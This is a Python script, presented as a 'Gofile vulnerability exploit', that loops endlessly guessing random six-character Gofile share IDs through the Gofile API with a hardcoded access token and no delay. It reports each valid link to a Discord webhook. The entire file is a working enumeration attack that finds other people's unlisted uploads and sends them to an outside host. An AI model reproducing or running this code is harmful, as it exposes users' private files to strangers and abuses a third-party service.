# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
#
# Gofile Vulnerability Exploit Script by RocketGod
# https://github.com/RocketGod-git/gofile-vulnerability-exploit-script

import random
import string
import requests
import time
import json

# Step 1: Generate a random 6-character alphanumeric string
def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Constants
GOFILE_API_URL_TEMPLATE = "https://api.gofile.io/getContent?contentId={}&token=tkSq4sZgzzG1GVsQ2FwDTfmfSTlRDd54&websiteToken=7fd94ds12fds4&cache=false"
GOFILE_URL_TEMPLATE = "https://gofile.io/d/{}"
DISCORD_WEBHOOK_URL = "YOUR-DISCORD-WEBHOOK-GOES-HERE"

# Step 2: Check the validity of a Gofile URL using the Gofile API
def check_gofile_url(random_string):
    url = GOFILE_API_URL_TEMPLATE.format(random_string)
    try:
        response = requests.get(url)

        # Check for rate limiting
        if response.status_code == 429:
            print("[ERROR] Rate limited by Gofile. Consider waiting for a while before resuming.")
            return None  # Return None to indicate rate limit

        response_data = response.json()

        # Check for other API errors
        if "status" in response_data and response_data["status"] == "error-notFound":
            return False
        elif "error" in response_data:
            print(f"[ERROR] API returned error: {response_data['error']}")
            return None  # Return None to indicate an API error

        return True

    except json.JSONDecodeError:
        print("[ERROR] Failed to decode JSON from Gofile API response.")
        return None  # Return None to indicate JSON decode error
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None  # Return None to indicate request error

# Step 3: Send a POST request to the Discord webhook
def send_to_discord(url):
    data = {
        "content": f"Valid Gofile URL found: {url}"
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        if response.status_code != 204:  
            print(f"[ERROR] Discord webhook call failed with status code {response.status_code}: {response.text}")
    except requests.RequestException as e:
        print(f"[ERROR] Failed to send data to Discord: {e}")

# Main loop
def main():
    while True:
        # Generate random string and build URL
        random_string = generate_random_string()
        url = GOFILE_URL_TEMPLATE.format(random_string)
        
        # Check if URL is valid
        valid = check_gofile_url(random_string)
        if valid is True:
            print(f"[SUCCESS] Valid URL found: {url}")
            send_to_discord(url)
        elif valid is False:
            print(f"[FAIL] Invalid URL: {url}")
        # If valid is None, an error occurred. 
        
        # Sleep for whatever seconds to avoid potential rate limiting
        time.sleep(0)

if __name__ == "__main__":
    main()
